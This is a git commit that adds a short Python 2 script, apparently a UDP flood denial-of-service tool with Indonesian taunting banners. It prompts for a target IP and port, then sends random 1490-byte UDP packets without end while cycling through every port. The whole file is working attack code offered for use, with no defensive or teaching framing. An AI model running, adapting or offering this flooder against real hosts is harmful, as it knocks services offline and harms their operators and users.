6f75696d15f14efe16c7cf221b6d63d38e00bcd7
AsepStrong28 <100581795+AsepStrong28@users.noreply.github.com>
2022-02-28 19:44:04 +0700

    Add files via upload

---
+++ AsepOP.py
@@ -0,0 +1,46 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("RYUU NIH DECK")
+print
+print "RYUU NIH DECK SENGGOL DONG"
+print
+ip = raw_input("IP  : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("AWAS DOWN!!")
+
+
+
+
+
+
+
+
+
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
